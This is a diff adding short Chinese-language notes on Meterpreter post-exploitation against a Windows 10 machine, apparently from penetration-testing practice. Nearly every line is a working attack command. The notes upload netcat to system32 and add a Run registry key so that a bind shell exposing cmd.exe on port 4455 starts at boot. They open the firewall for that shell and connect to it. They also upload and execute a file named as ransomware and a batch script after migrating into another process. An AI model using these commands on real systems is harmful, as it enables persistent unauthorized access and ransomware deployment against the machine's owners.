@@ -1,0 +1,17 @@
+//建立window10-2019-3的meterpreter后可以上传文件到指定目录并去执行它
+upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
+//建立开机启动的命令
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 4455 -e cmd.exe'
+//允许防火墙通过允许
+netsh advfirewall firewall add rule name="4455" protocol=TCP dir=in localport=4455 action=allow
+//重启后，需要用户进入系统后，后门程序才会运行，在这个界面后门程序还没有运行。
+nc -v 192.168.1.102 4455
+//也可以直接上传一个MM.exe然后去直接运行它
+upload /root/勒索病毒.exe c:\\Users
+execute -f c:\\勒索病毒.exe
+//也可以上传一个bat去批量执行任务
+upload /root/start.bat c:\\Users
+ps | grep explo
+//找出对应的pid后，迁移进程
+migrate 3245
+execute -f c:\\Users\\start.bat
